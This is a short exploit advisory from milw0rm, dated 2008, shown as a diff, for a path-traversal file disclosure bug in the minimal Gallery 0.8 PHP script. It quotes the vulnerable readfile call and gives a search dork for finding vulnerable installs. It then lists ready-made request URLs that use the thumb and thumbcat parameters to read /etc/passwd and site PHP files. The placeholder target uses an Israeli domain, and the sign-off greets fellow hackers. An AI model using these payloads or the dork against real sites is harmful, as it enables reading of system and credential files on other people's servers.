@@ -1,0 +1,33 @@
+# Script : minimal Gallery 0.8                                                  
+# Download : http://minimaldesign.net/downloads/projects/minimal-gallery                         
+# BUG :  Remote File Disclosure Vulnerability  
+# Dork : powered by minimal Gallery 0.8
+         
+## Vulnerable CODE :
+~~~~~~~~~ /_mg/php/mg_thumbs.php ~~~~~~~~~~~~~~~~~
+readfile("../$thumbs_dir/$thumbcat$thumb");
+
+the variables thumbcat & thumb are defined in page mg_thumbs.php like that : 
+$thumbcat = $_GET['thumbcat'];
+$thumb = $_GET['thumb'];
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		 
+
+# Exploit : 
+
+[Target.il]/[Path_mGallery]/_mg/php/mg_thumbs.php?thumbcat=../../../../../../etc/passwd
+[Target.il]/[Path_mGallery]/_mg/php/mg_thumbs.php?thumbcat=../../../../../../[file].php
+
+[Target.il]/[Path_mGallery]/_mg/php/mg_thumbs.php?thumb=../../../../../../etc/passwd
+[Target.il]/[Path_mGallery]/_mg/php/mg_thumbs.php?thumb=../../../../../../[file].php
+
+
+# phpinfo(); View >> [Target.il]/[Path_mGallery]/php_info.php
+
+
+# greezt :  coNan , GoLd_M , RoMaNcYxHaCkEr , Rachidox ,  and all muslims Hackers 
+
+######################################################################################
+#              H-T TeaM {HouSSaMix _ ToXiC350}  from MoRoCCo                         #
+######################################################################################
+
+# milw0rm.com [2008-01-13]
